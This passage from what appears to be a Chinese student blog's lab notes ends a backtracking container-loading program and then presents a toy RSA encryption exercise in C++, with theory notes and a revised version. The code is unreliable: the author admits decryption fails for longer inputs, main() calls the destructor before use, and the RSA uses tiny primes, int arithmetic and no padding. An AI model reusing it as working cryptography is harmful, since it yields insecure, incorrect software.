            for(int j=1;j&lt;=n;j++)
            {
                bestx[j]=x[j];   //把当前解赋给最优解
            }
            bestw=cw;    //把当前载重量赋给当前最优载重量
        }
    }

    r=r-w[i];  //剩余集装箱的总重量
    if(cw+w[i]&lt;=c1) //判断该集装箱到底放不放
    {
        x[i]=1;
        cw=cw+w[i];
        Backtrack(i+1);
        //当节点i的子树延伸结束时要返回i节点
        x[i]=0;
        cw=cw-w[i];

    }
    if(cw+r&gt;bestw) //判断先不放该集装箱后是否还有可行解
    {
        x[i]=0;
        Backtrack(i+1);
    }
    r=r+w[i];

} 
 
template &lt;class T&gt; 
void Loading&lt;T&gt;::Show() 
{
    int c2w=0;
    for(int i=1;i&lt;=n;i++)
    {
        if(bestx[i]==0)
        {
            c2w=c2w+w[i];
        }
    }
    if(c2w&gt;c2)
        cout&lt;&lt;endl&lt;&lt;"装载失败！无法装下所有的集装箱！"&lt;&lt;endl;
    else
    {
        cout &lt;&lt; endl&lt;&lt;"成功装载！" &lt;&lt; endl;
        cout&lt;&lt;"第一艘船所装的集装箱为："&lt;&lt;endl;
        for(int i=1;i&lt;=n;i++)
        {
            if(bestx[i]==1)
                cout&lt;&lt;i&lt;&lt;" ";
        }
        cout&lt;&lt;endl;
        cout&lt;&lt;"第二艘船所装的集装箱为："&lt;&lt;endl;
        for(int i=1;i&lt;=n;i++)
        {
            if(bestx[i]!=1)
                cout&lt;&lt;i&lt;&lt;" ";
        }

    }

} 
 
int  main() 
{ 
  Loading&lt;int&gt; load;
  load.~Loading();
  load.Backtrack(1); 
  load.Show(); 
//   system("pause");
  return 0;
}
</code></pre>
<h2 id="实验四"><a href="#实验四" class="headerlink" title="实验四"></a>实验四</h2><h3 id="编程一个简单的RSA加、解密系统。"><a href="#编程一个简单的RSA加、解密系统。" class="headerlink" title="编程一个简单的RSA加、解密系统。"></a>编程一个简单的RSA加、解密系统。</h3><blockquote>
<ul>
<li><p>假设用户A选择两个素数p和q，计算得到n=pq和Φ(n)=(p-1)(q-1)。选择一个加密密钥e，它小于Φ(n)且与Φ(n)互素。计算解密密钥 d≡ e-1 mod Φ(n)。则用户A公布公开密钥{e,n}，自己拥有私有密钥{d,n}。</p>
</li>
<li><p>用户B使用用户 A 的公开密钥 e 和 n 对报文 M 进行加密，得到 C= Me mod n，并发送给用户 A。</p>
</li>
<li><p>用户A收到加密的报文后，使用自己的私有密钥 d 和 n 对加密报文 C 进行解密，恢复得到明文 M=Cd mod n。</p>
</li>
</ul>
</blockquote>
<h4 id="初始代码"><a href="#初始代码" class="headerlink" title="初始代码"></a>初始代码</h4><pre><code class="line-numbers language-c++">#include &lt;iostream&gt;
using namespace std;
int MOD;

//由公开密钥e和n，求私有密钥d
int ext_euclid(int a, int b, int &amp;x, int &amp;y) 
{ 
    if(b == 0)
    {
        x = 1;
        y = 0;
        return a;
    }
    int gcd = ext_euclid(b, a % b, x, y);
    int t = x % MOD;
    x = y % MOD;
    y = ((t - a / b * x) % MOD + MOD) % MOD;
    return gcd;
}

int main()
{
    int p, q, i, d;
    cout &lt;&lt; "请输入一个质数 p (如 101) :";
    cin &gt;&gt; p;
    cout &lt;&lt; "请输入一个质数 q (如 113) :";
    cin &gt;&gt; q;
    int n = p * q;
    cout&lt;&lt;"分组加密时，每个分组的大小 n 不能超过 p*q=";
    cout &lt;&lt; n &lt;&lt; endl;

    //求得φ(n)=(p-1)*(q-1)的值
    MOD = (p - 1) * (q - 1);
    cout &lt;&lt; "模φ(n)=(p-1)*(q-1)=";
    cout &lt;&lt; MOD &lt;&lt; endl &lt;&lt; endl;

    //选取与φ(n)互质的公钥e
    int e;
    cout &lt;&lt; "输入与φ(n)互质的公钥 e (如 3533):";
    cin &gt;&gt; e;

    //由e和φ(n)生成私钥d
    int x, y;
    ext_euclid(e, MOD, d, y);
    while(d &lt; 0) 
        d += MOD;
    cout &lt;&lt; "通过调用扩展欧几里德算法，求得密钥d为：" &lt;&lt; d &lt;&lt; endl;

    //利用生成的公钥{e,n}对明文M进行加密
    int M, C;
    cout &lt;&lt; "现在公钥{e,n}、私钥{d,n}均已生成完毕。\n\n请输入需要传输的明文内容进行加密(如9726):";
    cin &gt;&gt; M;
    C = 1;
    for(i = 1; i &lt;= e; i++)
        C = C * M % n;
    cout &lt;&lt;endl&lt;&lt; "-------------------- 加解密完成 ----------------------" &lt;&lt; endl&lt;&lt;endl;
    cout &lt;&lt; "明文M= " &lt;&lt; M &lt;&lt; "  经加密后得到密文C=M^e(mod n):  " &lt;&lt; C &lt;&lt; endl;

    //利用生成的私钥私钥{e,n}对密文C进行解密
    M = 1;
    for(i = 1; i &lt;= d; i++)
        M = M * C % n;
    cout &lt;&lt; "密文C= " &lt;&lt; C &lt;&lt; "  经解密后得到明文M=C^d(mod n):  " &lt;&lt; M &lt;&lt; endl;
    return 0;
}

</code></pre>
<h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><blockquote>
<p>由于第四次实验是在考试周的时候做的，对于RSA的原理也不是很清楚，上面的代码也是借鉴了网上的，自己实验时发现样例能正常运行，但是有的例子没办法正常解码，最近有空又重新研究了一下RSA，记录如下。</p>
</blockquote>
<p><strong>原理</strong></p>
<p>1.公钥与私钥的生成</p>
<p>（1）选取两个大素数：p和q,(p≠q)；<br>（2）计算n=p*q；<br>（3）利用欧拉(Euler)函数的性质与定理计算Φ(n)=(p-1)·(q-1)</p>
<blockquote>
<p><strong>欧拉函数</strong>  设n是自然数，数列1，2，···，n-1中与n互素的数的个数称为n的欧拉函数，记为Φ(n)</p>
<ul>
<li>性质    若p是素数，则Φ(p)=(p-1)</li>
<li>定理     设p和q是素数，对n=pq，有Φ(n)=Φ(p)Φ(q)=p-1)·(q-1)</li>
</ul>
</blockquote>
<p>（4）随机选择加密密钥e(公钥)，使 gcd(Φ(n),e)=1; 1&lt;e&lt;Φ(n)<br>（5）最后，利用Euclid（欧几里得）算法计算解密密钥d，使其满足ed=1（mod Φ(n)）。</p>
<blockquote>
<p>后来自己重新敲代码的时候对这一步产生了误解，因为书上给的公式是d=e^(-1)modΦ(n),我把e^(-1)理解成-1次幂了。后来重新看书和查资料，这里描述的应该是e和d是互逆的关系，e^(-1)指的是e是d关于模Φ(n)的乘法逆元</p>
<p><strong>乘法逆元</strong>    设a是整数，若存在x使得ax≡1(mod n),则称a与x互逆，x是a关于模n的乘法逆元(inverse),记为x=a^(-1)</p>
</blockquote>
<p>​    然后将（e，n）公开，即为公钥PK，私人保存好d，即为私钥SK。</p>
<p>2.加密与解密</p>
<p>加密公式为<br>$$<br>C=M^e  mod n<br>$$<br>解密公式为<br>$$<br>M^`=C^d  mod n<br>$$<br>一般在计算M^e modn的时候都是计算M mod n然后累乘 e次，这是按模计算原理的推论。</p>
<h4 id="重新敲的代码"><a href="#重新敲的代码" class="headerlink" title="重新敲的代码"></a>重新敲的代码</h4><blockquote>
<p>针对之前代码中出现的部分样例解密失败的问题，我认为与未对输入的素数和公钥e与Φ(n)是否互质进行检验有很大关系，于是在新的代码中加入了 JudgePrime 和 IsCoprime 分别进行判断，经过测试，成功解决了之前的解密失败问题（但是对于密文长度较长的情况还是会失败，目前未找到原因）:sob:</p>
</blockquote>
<pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
using namespace std;
int MOD;
int JudgePrime(int x)
{
    if(x == 1) return 1;
    for(int i=2;i &lt;=x/2;i++)
    {
        if(x % i == 0)
            return 0;  
    }
    return 1;
}


bool isCoprime(int x,int y)
{
    if(x==1 &amp;&amp; y==1)//1和1互质
        return true;
    else if(x&lt;=0 || y&lt;=0 || x==y)//非正整数都不存在互质的说法
        return false;
    else if(x==1 || y==1)//1和任何正整数都互质
        return true;
    else
    {
        int tmp=0;
        //使用求商判断法，如果输入的x&lt;y，第一次循环会交换x和y的位置
        while(true)
        {
            tmp=x%y;
            if(tmp==0)
            {
                break;
            }
            else
            {
                x=y;
                y=tmp;
            }
        }
        if(y==1)          //最大公约数为1,所以互质
            return true;
        else              //最大公约数大于1，所以不互质
            return false;
 
    }
}

//由公开密钥e和n，求私有密钥d
int ext_euclid(int a, int b, int &amp;x, int &amp;y) 
{ 
    if(b == 0)
    {
        x = 1;
        y = 0;
        return a;
    }
    int gcd = ext_euclid(b, a % b, x, y);
    int t = x % MOD;
    x = y % MOD;
    y = ((t - a / b * x) % MOD + MOD) % MOD;
    return gcd;
}


int main()
{
    int p,q,n,e,d;
    cout&lt;&lt;"请输入第一个大素数p："&lt;&lt;endl;
    cin&gt;&gt;p;
    while(!JudgePrime(p))
        {
            cout&lt;&lt;"【 抱歉，您输入的不是素数，请重新输入！】"&lt;&lt;endl;
             cin&gt;&gt;p;
        }
        
    cout&lt;&lt;"请输入第二个大素数q："&lt;&lt;endl;
    cin&gt;&gt;q;
    while(!JudgePrime(q))
        {
            cout&lt;&lt;"【 抱歉，您输入的不是素数，请重新输入！】"&lt;&lt;endl;
             cin&gt;&gt;q;
        }
    n=p*q;
    cout&lt;&lt;"\n乘积 n=p*q= "&lt;&lt;n&lt;&lt;endl;
    MOD=(p-1)*(q-1);
    cout&lt;&lt;"φ(n)=(p-1)(q-1)= "&lt;&lt;MOD&lt;&lt;endl;
    cout&lt;&lt;"\n请输入一个与φ(n)互质的公钥e: "&lt;&lt;endl;
    cin&gt;&gt;e;
    while(!isCoprime(e,MOD))
    {
        cout&lt;&lt;"【 e与φ(n)不互质，请重新输入！】"&lt;&lt;endl;
        cin&gt;&gt;e;
    }
    //由e和φ(n)生成私钥d
    int x, y;
    ext_euclid(e, MOD, d, y);
    while(d &lt; 0) 
        d += MOD;
    cout &lt;&lt; "\n通过调用扩展欧几里德算法，求得密钥d为：" &lt;&lt; d &lt;&lt; endl;

    //利用生成的公钥{e,n}对明文M进行加密
    int M, C;
    cout &lt;&lt; "现在公钥{e,n}、私钥{d,n}均已生成完毕。\n\n请输入需要传输的明文内容进行加密:";
    cin &gt;&gt; M;
    cout &lt;&lt;endl&lt;&lt; "-------------------- 加解密完成 ----------------------" &lt;&lt; endl&lt;&lt;endl;
    C = 1;
    for(int i = 1; i &lt;= e; i++)
        C = C * M % n;
    cout &lt;&lt; "明文M= " &lt;&lt; M &lt;&lt; "  经加密后得到密文C=M^e(mod n):  " &lt;&lt; C &lt;&lt; endl;

    //利用生成的私钥私钥{e,n}对密文C进行解密
    M = 1;
    for(int i = 1; i &lt;= d; i++)
        M = M * C % n;
    cout &lt;&lt; "密文C= " &lt;&lt; C &lt;&lt; "  经解密后得到明文M=C^d(mod n):  " &lt;&lt; M &lt;&lt; endl;
    return 0;


}
</code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>算法设计与分析</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法设计与分析</tag>
      </tags>
  </entry>
</search>
